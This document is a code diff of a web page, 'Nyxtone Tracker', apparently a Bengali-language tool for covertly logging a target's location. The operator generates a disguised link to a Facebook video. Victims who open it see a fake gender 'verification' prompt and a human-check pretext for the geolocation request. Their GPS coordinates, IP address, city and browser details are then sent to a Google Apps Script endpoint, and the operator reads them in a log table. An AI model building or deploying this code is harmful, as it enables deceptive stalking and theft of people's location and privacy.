@@ -1,216 +1,189 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nyxtone Tracker - Securexen</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
-    <style>
-        :root { --bg: #ffffff; --container-bg: #ffffff; --text: #000000; --gray: #f8f8f8; --border: #000000; }
-        [data-theme="dark"] { --bg: #0a0a0a; --container-bg: #121212; --text: #ffffff; --gray: #1e1e1e; --border: #333333; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; transition: 0.3s; }
-        body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .header-controls { position: fixed; top: 25px; width: 100%; display: flex; justify-content: space-between; padding: 0 25px; }
-        .ui-btn { padding: 10px 20px; background: var(--container-bg); color: var(--text); border: 1px solid var(--border); border-radius: 50px; font-weight: 700; font-size: 11px; cursor: pointer; text-transform: uppercase; }
-        .main-container { width: 100%; max-width: 650px; padding: 40px; border: 1px solid var(--border); border-radius: 30px; background: var(--container-bg); text-align: center; margin-top: 60px; }
-        h1 { font-size: 28px; font-weight: 800; margin-bottom: 10px; letter-spacing: -1px; }
-        p { font-size: 13px; opacity: 0.6; margin-bottom: 25px; }
-        .input-group { text-align: left; margin-bottom: 15px; }
-        label { display: block; font-weight: 800; font-size: 10px; text-transform: uppercase; margin-bottom: 5px; opacity: 0.7; }
-        input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid var(--border); background: var(--gray); color: var(--text); font-weight: 600; outline: none; }
-        .gen-btn { width: 100%; padding: 16px; background: var(--text); color: var(--bg); border: none; border-radius: 12px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
-        #result-box { margin-top: 25px; padding: 20px; background: var(--gray); border-radius: 15px; border: 1px dashed var(--border); display: none; }
-        .link-text { font-size: 14px; font-weight: 700; color: #007bff; word-break: break-all; cursor: pointer; display: block; padding: 10px; }
-        .res-section { margin-top: 40px; border-top: 1px solid var(--border); padding-top: 30px; }
-        table { width: 100%; margin-top: 20px; border-collapse: collapse; font-size: 12px; }
-        th, td { border: 1px solid var(--border); padding: 10px; text-align: left; }
-        th { background: var(--gray); }
-        .footer { margin-top: 30px; font-size: 10px; opacity: 0.5; font-weight: 600; }
-        
-        .victim-card { padding: 40px; border-radius: 25px; background: #fff; box-shadow: 0 15px 50px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; color: #000; }
-        .btn-m { background: #007bff; color: white; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin: 10px; width: 100%; }
-        .btn-f { background: #e83e8c; color: white; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin: 10px; width: 100%; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nyxtone Tracker - Securexen</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --bg: #ffffff; --container-bg: #ffffff; --text: #000000; --gray: #f8f8f8; --border: #000000; }
+        [data-theme="dark"] { --bg: #0a0a0a; --container-bg: #121212; --text: #ffffff; --gray: #1e1e1e; --border: #333333; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; transition: 0.3s; }
+        body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .header-controls { position: fixed; top: 25px; width: 100%; display: flex; justify-content: space-between; padding: 0 25px; }
+        .ui-btn { padding: 10px 20px; background: var(--container-bg); color: var(--text); border: 1px solid var(--border); border-radius: 50px; font-weight: 700; font-size: 11px; cursor: pointer; text-transform: uppercase; }
+        .main-container { width: 100%; max-width: 650px; padding: 40px; border: 1px solid var(--border); border-radius: 30px; background: var(--container-bg); text-align: center; margin-top: 60px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        h1 { font-size: 28px; font-weight: 800; margin-bottom: 10px; letter-spacing: -1px; }
+        p { font-size: 13px; opacity: 0.6; margin-bottom: 25px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-weight: 800; font-size: 10px; text-transform: uppercase; margin-bottom: 5px; opacity: 0.7; }
+        input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid var(--border); background: var(--gray); color: var(--text); font-weight: 600; outline: none; }
+        .gen-btn { width: 100%; padding: 16px; background: var(--text); color: var(--bg); border: none; border-radius: 12px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        #result-box { margin-top: 25px; padding: 20px; background: var(--gray); border-radius: 15px; border: 1px dashed var(--border); display: none; }
+        .link-text { font-size: 14px; font-weight: 700; color: #007bff; word-break: break-all; cursor: pointer; display: block; padding: 10px; }
+        .res-section { margin-top: 40px; border-top: 1px solid var(--border); padding-top: 30px; }
+        table { width: 100%; margin-top: 20px; border-collapse: collapse; font-size: 12px; }
+        th, td { border: 1px solid var(--border); padding: 10px; text-align: left; }
+        th { background: var(--gray); }
+        .footer { margin-top: 30px; font-size: 10px; opacity: 0.5; font-weight: 600; }
+        
+        .victim-card { padding: 40px; border-radius: 25px; background: #fff; box-shadow: 0 15px 50px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; color: #000; }
+        .btn-m { background: #007bff; color: white; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin: 10px; width: 100%; }
+        .btn-f { background: #e83e8c; color: white; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin: 10px; width: 100%; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body data-theme="light">
 
-    <div id="main-ui" style="width: 100%; display: flex; justify-content: center;">
-        <div class="header-controls">
-            <button class="ui-btn" onclick="location.href='tools.html'">← BACK</button>
-            <button class="ui-btn" onclick="toggleTheme()" id="theme-btn">DARK MODE</button>
-        </div>
+    <div id="main-ui" style="width: 100%; display: flex; justify-content: center;">
+        <div class="header-controls">
+            <button class="ui-btn" onclick="location.href='#'">← BACK</button>
+            <button class="ui-btn" onclick="toggleTheme()" id="theme-btn">DARK MODE</button>
+        </div>
 
-        <div class="main-container">
-            <h1>Nyxtone Private Logger</h1>
-            <p>সরাসরি জিপিএস পিন লোকেশন লগার - মাহিম স্পেশাল</p>
+        <div class="main-container">
+            <h1>Nyxtone Private Logger</h1>
+            <p>সরাসরি জিপিএস পিন লোকেশন লগার - মাহিম স্পেশাল</p>
 
-            <div class="input-group">
-                <label>Your Secret ID</label>
-                <input type="text" id="user-id" placeholder="যেকোনো আইডি">
-            </div>
+            <div class="input-group">
+                <label>Your Secret ID</label>
+                <input type="text" id="user-id" placeholder="যেকোনো আইডি">
+            </div>
 
-            <div class="input-group">
-                <label>Target Video Link</label>
-                <input type="text" id="fb-link" placeholder="https://facebook.com/reels/...">
-            </div>
+            <div class="input-group">
+                <label>Target Video Link</label>
+                <input type="text" id="fb-link" placeholder="https://facebook.com/reels/...">
+            </div>
 
-            <button class="gen-btn" onclick="generateLink()">Create Tracking Link</button>
+            <button class="gen-btn" onclick="generateLink()">Create Tracking Link</button>
 
-            <div id="result-box">
-                <label>Share this link:</label>
-                <span class="link-text" id="final-link" onclick="copyLink()"></span>
-                <p style="font-size: 10px; color: #d9534f; margin-top: 5px;">ভিকটিম জেন্ডার সিলেক্ট করলে জিপিএস ডাটা আসবে!</p>
-            </div>
+            <div id="result-box">
+                <label>Share this link:</label>
+                <span class="link-text" id="final-link" onclick="copyLink()"></span>
+                <p style="font-size: 10px; color: #d9534f; margin-top: 5px;">ভিকটিম জেন্ডার সিলেক্ট করলে জিপিএস ডাটা আসবে!</p>
+            </div>
 
-            <div class="res-section">
-                <h3>Logs Result</h3>
-                <div class="input-group" style="margin-top: 15px;">
-                    <input type="text" id="check-id" placeholder="আইডি দাও">
-                </div>
-                <button class="gen-btn" style="background: var(--gray); color: var(--text);" onclick="fetchResults()">Check Logs</button>
+            <div class="res-section">
+                <h3>Logs Result</h3>
+                <div class="input-group" style="margin-top: 15px;">
+                    <input type="text" id="check-id" placeholder="আইডি দাও">
+                </div>
+                <button class="gen-btn" style="background: var(--gray); color: var(--text);" onclick="fetchResults()">Check Logs</button>
 
-                <table id="log-table" style="display: none;">
-                    <thead>
-                        <tr><th>IP</th><th>Location / Google Map</th><th>Time</th></tr>
-                    </thead>
-                    <tbody id="table-body"></tbody>
-                </table>
-            </div>
+                <table id="log-table" style="display: none;">
+                    <thead>
+                        <tr><th>IP</th><th>Location / Google Map</th><th>Time</th></tr>
+                    </thead>
+                    <tbody id="table-body"></tbody>
+                </table>
+            </div>
 
-            <div class="footer">© 2026 Bangladesh Securexen | Made by Ｎｙｘｔｏｎｅ 𖤍</div>
-        </div>
-    </div>
+            <div class="footer">© 2026 Bangladesh Securexen | Made by Ｎｙｘｔｏｎｅ 𖤍</div>
+        </div>
+    </div>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbySxD9Mr_ToHB0g0kRCYoffi9SNKUX2F9jjrW9YRj-3tAKLdr3LUqnC8pPjWlDnZG_oEw/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbySxD9Mr_ToHB0g0kRCYoffi9SNKUX2F9jjrW9YRj-3tAKLdr3LUqnC8pPjWlDnZG_oEw/exec";
 
-    function toggleTheme() {
-        const body = document.body;
-        const btn = document.getElementById('theme-btn');
-        if (body.getAttribute('data-theme') === 'light') {
-            body.setAttribute('data-theme', 'dark');
-            btn.innerText = "LIGHT MODE";
-        } else {
-            body.setAttribute('data-theme', 'light');
-            btn.innerText = "DARK MODE";
-        }
-    }
+    function toggleTheme() {
+        const body = document.body;
+        const btn = document.getElementById('theme-btn');
+        if (body.getAttribute('data-theme') === 'light') {
+            body.setAttribute('data-theme', 'dark');
+            btn.innerText = "LIGHT MODE";
+        } else {
+            body.setAttribute('data-theme', 'light');
+            btn.innerText = "DARK MODE";
+        }
+    }
 
-    function generateLink() {
-        const id = document.getElementById('user-id').value;
-        const fb = document.getElementById('fb-link').value;
-        if(!id || !fb) return alert("সব তথ্য দাও মাহিম!");
-        const longLink = `${window.location.href.split('?')[0]}?id=${id}&v=${btoa(fb)}`;
-        document.getElementById('result-box').style.display = "block";
-        document.getElementById('final-link').innerText = longLink;
-    }
+    function generateLink() {
+        const id = document.getElementById('user-id').value;
+        const fb = document.getElementById('fb-link').value;
+        if(!id || !fb) return alert("সব তথ্য দাও মাহিম!");
+        const currentUrl = window.location.href.split('?')[0];
+        const longLink = `${currentUrl}?id=${id}&v=${btoa(fb)}`;
+        document.getElementById('result-box').style.display = "block";
+        document.getElementById('final-link').innerText = longLink;
+    }
 
-    function copyLink() {
-        navigator.clipboard.writeText(document.getElementById('final-link').innerText);
-        alert("লিঙ্ক কপি হয়েছে!");
-    }
+    function copyLink() {
+        const text = document.getElementById('final-link').innerText;
+        navigator.clipboard.writeText(text).then(() => alert("লিঙ্ক কপি হয়েছে!"));
+    }
 
-    async function fetchResults() {
-        const id = document.getElementById('check-id').value;
-        if(!id) return alert("আইডি দাও!");
-        const res = await fetch(SCRIPT_URL);
-        const data = await res.json();
-        const tbody = document.getElementById('table-body');
-        tbody.innerHTML = "";
-        let found = false;
-        data.forEach((row, index) => {
-            if(index === 0) return;
-            if(row[0] == id) {
-                found = true;
-                tbody.innerHTML += `<tr><td>${row[1]}</td><td>${row[2]}</td><td>${new Date(row[4]).toLocaleString()}</td></tr>`;
-            }
-        });
-        if(found) document.getElementById('log-table').style.display = "table";
-        else alert("কোনো ডাটা পাওয়া যায়নি!");
-    }
+    async function fetchResults() {
+        const id = document.getElementById('check-id').value;
+        if(!id) return alert("আইডি দাও!");
+        try {
+            const res = await fetch(SCRIPT_URL);
+            const data = await res.json();
+            const tbody = document.getElementById('table-body');
+            tbody.innerHTML = "";
+            let found = false;
+            data.forEach((row, index) => {
+                if(index === 0) return;
+                if(row[0] == id) {
+                    found = true;
+                    tbody.innerHTML += `<tr><td>${row[1]}</td><td><a href="${row[2]}" target="_blank">View Map</a></td><td>${new Date(row[4]).toLocaleString()}</td></tr>`;
+                }
+            });
+            if(found) document.getElementById('log-table').style.display = "table";
+            else alert("কোনো ডাটা পাওয়া যায়নি!");
+        } catch(e) { alert("Error fetching data!"); }
+    }
 
-    // Victim Side
-    async function track() {
-        const params = new URLSearchParams(window.location.search);
-        const id = params.get('id');
-        const v = params.get('v');
+    async function track() {
+        const params = new URLSearchParams(window.location.search);
+        const id = params.get('id');
+        const v = params.get('v');
+        if(id && v) {
+            document.body.innerHTML = `
+                <div class="victim-card">
+                    <h2 style="margin-bottom:10px;">User Verification</h2>
+                    <p>Select your gender to proceed</p>
+                    <button class="btn-m" onclick="askGPS()">MALE</button>
+                    <button class="btn-f" onclick="askGPS()">FEMALE</button>
+                </div>`;
+            document.body.style.background = "#f0f2f5";
+        }
+    }
 
-        if(id && v) {
-            document.body.innerHTML = `
-                <div class="victim-card">
-                    <h2 style="margin-bottom:10px;">User Verification</h2>
-                    <p>Select your gender to proceed</p>
-                    <button class="btn-m" onclick="askGPS()">MALE</button>
-                    <button class="btn-f" onclick="askGPS()">FEMALE</button>
-                </div>`;
-            document.body.style.background = "#f0f2f5";
-        }
-    }
+    function askGPS() {
+        const params = new URLSearchParams(window.location.search);
+        const id = params.get('id');
+        const v = params.get('v');
+        document.body.innerHTML = `<div class="victim-card"><div class="loader"></div><h3>Verifying...</h3><p>Click <b>'Allow'</b> to confirm.</p></div>`;
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapLink = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                await sendToSheet(id, mapLink);
+                window.location.href = atob(v);
+            }, async () => {
+                await sendToSheet(id, "GPS Denied (IP Only)");
+                window.location.href = atob(v);
+            }, { enableHighAccuracy: true });
+        } else { window.location.href = atob(v); }
+    }
 
-    function askGPS() {
-        const params = new URLSearchParams(window.location.search);
-        const id = params.get('id');
-        const v = params.get('v');
-
-        document.body.innerHTML = `
-            <div class="victim-card">
-                <div class="loader"></div>
-                <h3>Verifying...</h3>
-                <p>Click <b>'Allow'</b> to confirm you are human.</p>
-            </div>`;
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                const lat = position.coords.latitude;
-                const lon = position.coords.longitude;
-                // এইবার লিঙ্কটা একদম ফিক্সড - সরাসরি গুগল ম্যাপ পিন
-                const mapLink = "https://www.google.com/maps?q=" + lat + "," + lon;
-                
-                await sendToSheet(id, mapLink);
-                window.location.href = atob(v);
-            }, async (error) => {
-                await sendToSheet(id, "GPS Blocked (IP/City Only)");
-                window.location.href = atob(v);
-            }, { enableHighAccuracy: true, timeout: 10000 });
-        } else {
-            window.location.href = atob(v);
-        }
-    }
-
-    async function sendToSheet(id, locationData) {
-        try {
-            const locRes = await fetch('https://ipapi.co/json/');
-            const locData = await locRes.json();
-            const city = locData.city ? ` (${locData.city}, ${locData.country_name})` : "";
-            
-            await fetch(SCRIPT_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    id: id,
-                    ip: locData.ip || "Unknown",
-                    location: locationData + city,
-                    device: navigator.userAgent
-                })
-            });
-        } catch(e) {
-            // যদি ipapi কাজ না করে তবে সরাসরি লোকেশন পাঠানো হবে
-            await fetch(SCRIPT_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    id: id,
-                    ip: "Hidden",
-                    location: locationData,
-                    device: navigator.userAgent
-                })
-            });
-        }
-    }
-
-    track();
+    async function sendToSheet(id, locationData) {
+        try {
+            const locRes = await fetch('https://ipapi.co/json/');
+            const locData = await locRes.json();
+            await fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    id: id,
+                    ip: locData.ip || "Unknown",
+                    location: locationData + " (" + (locData.city || "") + ")",
+                    device: navigator.userAgent
+                })
+            });
+        } catch(e) {}
+    }
+    track();
 </script>
 </body>
 </html>
